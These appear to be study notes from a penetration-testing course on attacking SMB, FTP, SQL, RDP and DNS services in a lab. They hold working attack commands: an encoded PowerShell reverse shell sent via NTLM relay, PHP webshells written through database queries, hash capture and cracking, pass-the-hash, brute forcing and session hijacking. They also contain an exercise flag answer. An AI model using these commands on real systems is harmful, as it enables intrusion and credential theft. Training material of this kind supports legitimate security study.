# Interacting with Common Services
`C:\htb> dir n: /a-d /s /b | find /c ":\"`

Syntax 	Description
    dir 	Application
    n: 	Directory or drive to search
    /a-d 	/a is the attribute and -d means not directories
    /s 	Displays files in a specified directory and all subdirectories
    /b 	Uses bare format (no heading information or summary)

```powershell
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt
```

`findstr /s /i cred n:\*.*`

Mount smb in powershell:
```powershell
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```
how many files in directory
`(Get-ChildItem -File -Recurse | Measure-Object).Count`

include to search for string
`Get-ChildItem -Recurse -Path N:\ -Include *cred* -File`
The `Select-String` cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use `Select-String` similar to grep in UNIX or `findstr.exe` in Windows.

Find files in Linux containing `cred`
```bash
grep -rn /mnt/Finance/ -ie cred
```

### SQSH lets us use a more friendlier promta
```sql
sqsh -S 10.129.20.13 -U username -P Password123
```

In windows
`sqlcmd -S 10.129.20.13 -U username -P Password123`

MySql linux
`mysql -u username -pPassword123 -h 10.129.20.13`

For linux we can use `dbeaver` for sql, similar to sqlserver
`sudo dpkg -i dbeaver-<version>.deb`

Tools to interact:
    SMB 	FTP 	Email 	Databases
    smbclient 	ftp 	Thunderbird 	mssql-cli
    CrackMapExec 	lftp 	Claws 	mycli
    SMBMap 	ncftp 	Geary 	mssqlclient.py
    Impacket 	filezilla 	MailSpring 	dbeaver
    psexec.py 	crossftp 	mutt 	MySQL Workbench
    smbexec.py 		mailutils 	SQL Server Management Studio or SSMS
            sendEmail 	
            swaks 	
            sendmail

Great vulnerability to exploit is `Log4j` [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228) 

# FTP
Scan:
`sudo nmap -sC -sV -p 21 192.168.2.142 `
Anonymous login is a misconfiguration

We can use `medusa` to brute force FTP
```bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

We can use `FTP` as bounce serveres:
`nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`

A posible attack for FTP is [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
`curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`

# Attacking SMB
Enumerate:
`sudo nmap 10.129.14.128 -sV -sC -p139,445`

### Misconfigurations:
Anonimous enumeration:
`smbclient -N -L //10.129.14.128`
`smbmap -H 10.129.14.128`
using `-r` recursive, we can brows the directories
`smbmap -H 10.129.14.128 -r notes`
`smbmap -H 10.129.14.128 --download "notes\note.txt"`
`smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`

To attack with RPC, we can instead use `Enum4linux`
`./enum4linux-ng.py 10.10.11.45 -A -C`

`CrackMapExec` is usually associated with smb

If we're using a non-domain joined computer, we will need to use `--local-auth` flag. 
`crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`

To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command:
`impacket-psexec administrator:'Password123!'@10.10.110.17`

### CrackMapExec
Another tool we can use to run CMD or PowerShell is CrackMapExec. One advantage of CrackMapExec is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, smb, the IP address or IP address range, the option -u for username, and -p for the password, and the option -x to run cmd commands or uppercase -X to run PowerShell commands.

Extract sam:
`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`

prt
`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`

### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.

The most common tool to perform such operations is the Responder. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Let's illustrate an example to understand better how Responder works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:

`responder -I <interface name>`
e.g.,
`sudo responder -I ens33`

That is to catch traffic that is broadcasted. e.g., someone is mistyping an smb connection, we can say it's us the user is looking for


All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module `5600`.

The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using `impacket-ntlmrelayx` or `Responder` `MultiRelay.py`. Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf)
`cat /etc/responder/Responder.conf | grep 'SMB ='`

Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.

`impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`

We can create a reverse shell:
```powershell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

# Attacking SQL Databases
`nmap -Pn -sV -sC -p1433 10.10.10.125`

In the past, there was a vulnerability CVE-2012-2122 in MySQL 5.6.x servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the timing attack vulnerability existed in the way MySQL handled authentication attempts.
In the case of MySQL 5.6.x, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.

interact:
`mysql -u julio -pPassword123 -h 10.129.20.13`
or in cmd:
`sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30`

Can also use Impacket:
`mssqlclient.py -p 1433 julio@10.129.203.7 `

If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.

### We can also execute commands
XP_CMDSHELL

```powershell
1> xp_cmdshell 'whoami'
2> GO
```

If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

We can write into local file:
```mssql
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.

We can show the secure file privileges:
`\show variables like "secure_file_priv"`

To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
```mssql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

# Create a file:
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files

By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
```powershell
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
`mysql> select LOAD_FILE("/etc/passwd");`

### Capture MSSQL Service Hash
In the Attacking SMB section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:

```mssql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
# Or
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### XP_SUBDIRS Hash Stealing with Responder
`sudo responder -I tun0`

or with impacket
`sudo impacket-smbserver share ./ -smb2support`

### Impersonate Existing Users with MSSQL
```mssql
# Identify Users that We Can Impersonate
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

sa
ben
valentin

# Verifying our Current User and Role
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

julio   

```

As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.
### Impersonating the SA User
```mssql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

sa
```

<b>Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.</b>

Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

### Communicate with Other Databases with MSSQL
MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
```mssql
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
```

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As sysadmin, we control the SQL Server instance. We can read data from any database or execute system commands with xp_cmdshell. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as PostGreSQL, SQLite, Oracle, Firebase, and MongoDB which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.

# Exercise:
when in sqsh: show dowsn't really work
use: `SELECT name FROM master.dbo.sysdatabases`

stealing hash:
```bash
sudo impacket-smbserver share ./ -smb2support

hashcat -a 0 -m 5600 pw_hashed.hash ../../htb_17_passwords/mut_password.list
princess1

# thereafter log in using servername:
sqsh -S 10.129.11.213 -U WIN-02\\mssqlsvc -P princess1
USE flagDB;
SELECT * FROM tb_flag;
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
```

Finally, the hash is intercepted by tools like Responder, WireShark, or TCPDump and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the documentation from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.

# RDP
### RDP Session Hijacking
As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.

`C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`

To get session ids:
`query user`

To run the command, we can start the sessionhijack service :
`C:\htb> net start sessionhijack`

### PtH RDP
Adding the DisableRestrictedAdmin Registry Key
`C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
`xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`

Not all newer Windows variants are vulnerable to Bluekeep, according to Microsoft. Security updates for current Windows versions are available, and Microsoft has also provided updates for many older Windows versions that are no longer supported. Nevertheless, 950,000 Windows systems were identified as vulnerable to Bluekeep attacks in an initial scan in May 2019, and even today, about a quarter of those hosts are still vulnerable.

`Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not. `

# DNS
`nmap -p53 -Pn -sV -sC 10.10.110.213`

`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`

`fierce` can be used to enumerate DNS servers of the root domain and scan for a DNS zone transfer
`fierce --domain zonetransfer.me`

### Subdomain Enumeration
`./subfinder -d inlanefreight.com -v`
```bash
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
```       

The most common volnurability for DNS is `sub-domain takeover`:
[takeover](https://academy.hackthebox.com/module/116/section/1512)